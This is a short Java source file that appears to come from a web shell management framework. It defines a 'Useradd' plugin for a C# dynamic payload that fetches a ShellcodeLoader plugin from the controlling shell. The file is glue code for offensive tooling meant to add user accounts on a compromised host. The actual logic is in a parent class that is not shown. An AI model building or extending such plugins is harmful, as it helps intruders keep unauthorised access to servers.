package shells.plugins.csharp;

import core.annotation.PluginAnnotation;
import shells.plugins.generic.ShellcodeLoader;

@PluginAnnotation(payloadName = "CSharpDynamicPayload", Name = "Useradd", DisplayName = "Useradd")
public class Useradd extends shells.plugins.generic.Useradd {
    protected ShellcodeLoader getShellcodeLoader() {
        return (ShellcodeLoader) this.shellEntity.getFrame().getPlugin("ShellcodeLoader");
    }
}
